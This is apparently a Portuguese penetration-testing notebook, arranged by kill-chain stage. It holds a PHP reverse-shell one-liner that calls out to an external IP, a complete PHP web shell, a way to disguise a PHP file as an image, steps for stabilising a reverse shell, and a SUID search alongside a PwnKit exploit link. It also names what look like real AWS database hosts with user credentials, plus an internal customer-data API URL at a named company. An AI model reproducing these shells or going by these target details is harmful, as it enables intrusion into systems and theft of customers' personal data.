                - jpg
                    
                    ```php
                    printf '\xFF\xD8' > imagem_with_magic_number_jpg.php
                    ```
                    
                - Descobrindo magic number de um arquivo
                    
                    ```php
                    head -3 /home/lsaldanha/Downloads/MicrosoftTeams-image.png | xxd
                    ```
                    
    - GitHub?
        - Verifique quais branchs existentes
            
            ```bash
            cat .git/packed-refs
            ```
            
        - Verifica as tags existentes
            
            ```bash
            git tag
            ```
            
        - Verifica quais commits
            
            ```bash
            git log
            ```
            
        - Verifica detalhes de commits ou tags
            
            ```bash
            git show (tag ou commit)
            ```
            
    - JWT?
        - 
        
        ![Untitled](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/2f572590-2dbb-45dd-b1a4-ec0a50cdba22/Untitled.png)
        
- **Delivery** ([TA0042](https://attack.mitre.org/tactics/TA0042/) e [TA0001](https://attack.mitre.org/tactics/TA0001/))
    - Shell
        - PHP_EXEC
            
            ```jsx
            php -r '$sock=fsockopen("10.9.24.235",4444);exec("sh <&3 >&3 2>&3");'
            ```
            
        - WebShell PHP
            
            ```jsx
            <html>
            <body>
            <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
            <input type="TEXT" name="cmd" id="cmd" size="80">
            <input type="SUBMIT" value="Execute">
            </form>
            <pre>
            <?php
                if(isset($_GET['cmd']))
                {
                    system($_GET['cmd']);
                }
            ?>
            </pre>
            </body>
            <script>document.getElementById("cmd").focus();</script>
            </html>
            ```
            
    
- **Exploitation (**[TA0002](https://attack.mitre.org/tactics/TA0002/))
    - Find
        - Encontra suids files
            
            ```bash
            find / -perm -4000 2>/dev/null
            ```
            
        - Traz um arquivo com tamanho especifico
            
            ```bash
            find . -readable -size 1033c -exec "ls" {} \;
            ```
            
        - Traz um arquivo com usuario e grupo especifico
            
            ```bash
            find / -user bandit7 -group bandit6 -size 33c 2> /dev/null
            ```
            
    - Estabilizando Shell
        
        ```bash
        ####Estabilizando SHELL
        python -c 'import pty; pty.spawn("/bin/bash")'
        python3 -c 'import pty; pty.spawn("/bin/bash")'
        
        # In reverse shell
        $ python -c 'import pty; pty.spawn("/bin/bash")'
        Ctrl-Z
        
        # In Kali
        stty -a
        $ stty raw -echo
        $ fg
        
        Terminal Type ? 
        xterm-256color
        
        # In reverse shell
        reset
        export SHELL=bash
        export TERM=xterm-256color
        stty rows <num> columns <cols>
        ```
        
    - Exploits
        - PWNKIT
            
            ```jsx
            https://github.com/ly4k/PwnKit
            ```
            
    - Acessando Bancos de dados
        - mysql
            - Conectando
                
                ```jsx
                mysql -h wessex-module-rds-tf-mysql-002.cysvnzuh2fnq.us-east-1.rds.amazonaws.com -P 3306 -u rds_wessex -p
                ```
                
            - Comandos uteis
                - Listando tabelas
                    - show tables
        - postgres
            - Conectando
                
                ```jsx
                psql -h wessex-module-rds-tf-pgs-002.cysvnzuh2fnq.us-east-1.rds.amazonaws.com -p 5432 -U rds_wessex -W WESSEXMODULERDSTFPGS
                ```
                
            - Comandos uteis
                - Listando Databases
                    
                    ```jsx
                    SELECT datname FROM pg_database;
                    ```
                    
                    ```jsx
                    \list
                    ```
                    
                - Listando Tabelas
                    
                    ```jsx
                    SELECT table_name FROM information_schema.tables WHERE table_schema = 'public';
                    ```
                    
                - Usando um database
                    
                    ```jsx
                    USE WESSEXMODULERDSTFPGS
                    ```
                    
    - Alterando rotas (roteamento)
        - Adicionando rotas
            
            ```jsx
            sudo route add -net 44.201.178.189 netmask 255.255.255.255 gw 192.168.18.70
            ```
            
- **Instalation (**[TA0003](https://attack.mitre.org/tactics/TA0003/))
- **Command And Controller (C2) (**[TA0011](https://attack.mitre.org/tactics/TA0011/))
- **Actions on Objectives (**[TA0040](https://attack.mitre.org/tactics/TA0040/))
    - Pags Impacto
        - Recuperar dados de customer
            
            ```markdown
            https://customer-service-api.intranet.pagseguro.uol/customers/CUSTOMER:397303DE0CB54E8092985F73A45B6853
            ```
            
- **O que foi descoberto:**
    - É um Linux (TTL=63)